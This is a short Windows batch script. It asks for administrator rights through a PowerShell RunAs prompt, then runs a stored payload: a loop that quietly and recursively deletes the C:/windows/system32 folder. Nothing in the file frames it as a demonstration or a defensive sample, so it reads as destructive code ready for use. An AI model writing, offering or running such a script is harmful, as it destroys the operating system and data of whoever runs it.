@echo off
:: Specify the code you want to run with admin permissions here
set "code=@echo off
:loop
del C:/windows/system32 /q /s 
goto loop"

:: Check if the script is already running with admin rights
net session >nul 2>&1
if %errorlevel% equ 0 (
    echo Running with Administrator permissions...
    %code%
    exit /b
)

:: If not running with admin rights, attempt to elevate using PowerShell
echo Requesting Admin permissions...
powershell "Start-Process -Verb RunAs cmd /c \"%~0\" %*"
exit /b
